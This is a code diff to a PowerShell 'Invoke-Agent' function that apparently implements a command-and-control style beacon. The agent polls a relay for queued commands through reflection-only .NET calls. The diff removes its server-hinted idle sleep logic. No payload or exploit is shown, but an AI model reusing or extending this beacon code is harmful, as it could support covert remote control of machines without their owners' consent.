@@ -167,11 +167,6 @@ function Invoke-Agent {
         foreach ($h in $script:identityHeaders) {
             try { $null = CallInst (GetProp $req 'Headers') 'Add' @([string]$h[0], [string]$h[1]) } catch {}
         }
-        # Confirm the applied sleep so the relay extends sweep patience for THIS agent
-        # only (hint-blind agents keep the base offline timers).
-        if ($script:localSleepSec -gt 0) {
-            try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
-        }
         return $req
     }
     function B64Stream($base64) {
@@ -387,10 +382,8 @@ function Invoke-Agent {
     $script:inShip = $false
     $script:identityHeaders = $null
     $script:clrVersion = 'v4.0.30319'
-    # Deep-idle pacing state: the sleep the relay last hinted (X-Sleep-Hint, seconds
-    # 0-600) and whether the idle transition was already logged (one log ship per idle
-    # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
-    $script:localSleepSec = 0
+    # Whether the idle transition was already logged (one log ship per idle ENTRY —
+    # a ship EVERY idle cycle doubled the idle request cost).
     $script:idleLogged = $false
     # Debug flavor: first-beacon-cycle popups only (the csharp-agent "healthy idle
     # iterations stay silent" rule — one [6]/[7] pair, never one per loop).
@@ -453,19 +446,6 @@ function Invoke-Agent {
             return 'fail'
         }
         if ($script:firstPost) { $script:firstPost = $false; Dbg '[7] POST #1 ok' '' } #dbg
-        # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
-        # next POST after an empty answer. Old relays omit it (→ 0 = immediate
-        # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
-        # response stream closes. WebHeaderCollection.Get replaces the indexer (the
-        # indexer is a parameterized property reflection won't address by name).
-        # Helper returns are comma-wrapped (PSObject-wrapped on PS 2.0): re-binding Min's
-        # return straight into Max's args killed the CLR2 binder and the catch zeroed the
-        # hint — deep-idle pacing never applied on Win7. Unwrap + [int] cast at the boundary.
-        $hint = 0
-        try { $hint = [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint')) } catch { $hint = 0 }
-        $script:localSleepSec = 0
-        try { $script:localSleepSec = [int](@(CallStatic (ResolveM 'System.Math') 'Min' @(600, $hint))[0]) } catch {}
-        if ([int]$script:localSleepSec -lt 0) { $script:localSleepSec = 0 }
         # Win7 root cause (2026-09-23, field trace round 3): candidate (B) — ReadAllBytes'
         # stream-copy loop re-bound the comma-wrapped Read count into MemoryStream.Write's
         # args; the CLR2 binder refused it ("Write not found") and the catch masked every
@@ -485,14 +465,11 @@ function Invoke-Agent {
             $null = CallInst $resp 'Close' $null
         }
         $pending = @()
-        # Empty answer = nothing queued — re-POST after the hint. The idle log ships
+        # Empty answer = nothing queued — re-POST immediately. The idle log ships
         # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
         # cycle doubled the idle request cost.
         if ($answer.Length -eq 0) {
             if (-not $script:idleLogged) { Log 'idle - empty answer'; $script:idleLogged = $true }
-            # Deep-idle pacing: wait the hint out locally — the durable pool keeps
-            # commands queued; the cost is only pickup latency while deep-idle.
-            if ($script:localSleepSec -gt 0) { Start-Sleep -Seconds $script:localSleepSec }
             continue
         }
         $script:idleLogged = $false
